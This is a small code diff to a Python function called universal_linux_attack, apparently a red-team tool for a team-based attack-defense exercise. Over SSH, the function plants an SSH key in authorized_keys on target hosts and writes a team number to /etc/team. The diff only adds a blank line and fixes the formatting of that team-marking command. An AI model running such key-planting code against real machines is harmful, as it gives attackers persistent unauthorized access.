@@ -143,6 +143,7 @@ def universal_linux_attack(host):
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
         for command in commands_to_run:  
             ssh.sendline(command)
+            
             ssh.prompt()
             log_line(ssh.before.decode('utf8'), host)
 
@@ -164,7 +165,7 @@ def universal_linux_attack(host):
     log_line(ssh.before.decode('utf8'), host)
 
     ## Mark team numbers
-    mark_team_cmd = "echo {} > /etc/team"
+    mark_team_cmd = "echo -n {} > /etc/team".format(host.team_number)
     ssh.prompt()
     log_line("Logging team number for host on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(mark_team_cmd)
